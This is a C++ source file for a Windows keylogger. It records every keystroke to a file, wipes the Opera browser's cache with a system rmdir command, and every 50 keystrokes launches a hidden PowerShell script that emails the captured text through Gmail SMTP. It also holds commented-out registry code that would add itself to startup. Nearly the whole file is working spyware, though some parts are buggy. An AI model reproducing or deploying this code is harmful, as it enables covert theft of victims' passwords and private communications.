#include <bits/stdc++.h>
#include<windows.h>
using namespace std;
string Fetch(){
   return getenv("USERNAME");
}




void Make_Startup(){
/***
HKEY hKey;
const char* czStartName = "MyApplication";
const char* czExePath   = "C:\\Users\\user\\AppData\\Roaming\\Microsoft\\Windows\\MyApp.exe";

LONG lnRes = RegOpenKeyEx(  HKEY_CURRENT_USER,
                            "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0 , KEY_WRITE,
                            &hKey);
if( ERROR_SUCCESS == lnRes )
{
    lnRes = RegSetValueEx(  hKey,
                            czStartName,
                            0,
                            REG_SZ,
                            (unsigned char*)czExePath,
                            strlen(czExePath) );
}

RegCloseKey(hKey);
***/

}

void clear_dir(string browser,string user){


// rmdir /q /s
string query="rmdir /q /s ";
string path="C:\\Users\\"+user+"AppData\\Local\\Opera Software\\Opera Stable\\Cache\\Cache_Data";
query=query+path;
//cout<<query<<endl;
const char *command=query.c_str();
//cout<<command<<endl;
system(command);

}

void make_new_dir(string browser,string user){

// AppData\\Local\\Opera Software\\Opera Stable\\Cache\\\Cache_Data
// C:\\Users\\


string path="C:\\Users\\"+user+"// AppData\\Local\\Opera Software\\Opera Stable\\Cache\\Cache_Data";


std::wstring widestr = std::wstring(path.begin(), path.end());
const wchar_t* widecstr = widestr.c_str();
_wmkdir(widecstr);
}


string write(int key ){
    if(key==8)
        return "[BackSpace]";
   else if(key==20)
        return "[CapsLock]";
     else if(key==32)
        return "[Space]";
    else if(key==13)
        return "\n";
    else if(key==32)
        return " ";
    else if(key==VK_TAB)
        return "[TAB]";
    else if(key==VK_SHIFT)
       return "[SHIFT]";
    else if(key==VK_CONTROL)
        return "[CONTROL]";
    else if(key==VK_ESCAPE)
       return "[ESCAPE]";
    else if(key==VK_END)
        return "[END]";
    else if(key==VK_LEFT)
        return "[LEFT]";
    else if(key==VK_RIGHT)
       return "[RIGHT]";
    else if(key==VK_UP)
        return "[UP]";
    else if(key==VK_DOWN)
        return "[DOWN]";
    else if(key==VK_LEFT)
        return "[LEFT]";
    else if(key==VK_RBUTTON)
       return "[RBUTTON]";
    else if(key==VK_LBUTTON)
        return "[LBUTTON]";
    else if(key==VK_OEM_PERIOD)
       return ".";
    else
    {    string s(1,char(key));
        return s;
    }
}

void push_in_file(string key){

fstream file("keylog.text",file.app);
file<<key;
file.close();
}



void Mail_and_new(){

char* threadinput=(char*)malloc(1100*sizeof(char));
    threadinput[0]='\0';
    FILE *kp=fopen("Temp.txt","r");
    while(fgets(threadinput,1100,kp)!=NULL);
    //printf("input:%s\n",threadinput);
    fclose(kp);

string input=threadinput;

FILE *fp=fopen("KeyLogger.ps1","ab+");
    fprintf(fp,"$Myemail=\"your_id\"\n");
    fprintf(fp,"$Mypass=\"your_password\"\n");
    fprintf(fp,"$SMTP=\"smtp.gmail.com\"\n");
    fprintf(fp,"$to=\"receiver_id\"\n");
    fprintf(fp,"$Subject=\"KEYLOGGER\"\n");
    fprintf(fp,"$Body=\"%s\"\n",input);
    fprintf(fp,"$SecurePassword=Convertto-SecureString -String $Mypass -AsPlainText -force\n");
    fprintf(fp,"$MyCredentials=New-object System.Management.Automation.PSCredential $MyEmail,$SecurePassword\n");
    fprintf(fp,"Send-MailMessage -To $to -From $Myemail -Subject $Subject -Body $Body -SmtpServer $SMTP -Credential $MyCredentials -UseSSL -Port 587 -DeliveryNotificationOption never\n");
    fclose(fp);
    string syscall="PowerShell.exe -windowstyle hidden \"";
    wchar_t *curpath;
    curpath=_wgetcwd(NULL,0);

    wstring ws(curpath);
    string str(ws.begin(), ws.end());
    syscall=syscall+str;
    syscall=syscall+"\\KeyLogger.ps1\"";
    system(syscall.c_str());
    remove("KeyLogger.ps1");
}



DWORD WINAPI ThreadFunc(void *data)  //void *ThreadFunc(void *vargp)
{

    Mail_and_new();
    return 0;
}





int main()
{
     //FreeConsole();
     Make_Startup();


     remove("keylog.text");

    string user= Fetch();                // fetches necessary credentials
   clear_dir("opera",user);            //deletes the cache folder of browser
   make_new_dir("opera",user);         //makes new cache folder for browser

    int words=0;
    // recording the keys typed and writes them onto a file
    while(true){
            for(int i=8;i<=190;i++){
                if(GetAsyncKeyState(i)==-32767){           // GetAsyncKeyState(i) checks the state of all the keys from ascii values 8 to 190
                    string p_key=write(i);               //p_key stores the value of the key pressed
                       //cout<<p_key<<endl;                                  // write function retrieves the value of the key from its ascii value
                      push_in_file(p_key);
                      words++;
                      if(words==50){
                        words=0;
                         HANDLE thread = CreateThread(NULL,0,ThreadFunc,NULL,0,NULL);
                      }
                }
            }
    }
}

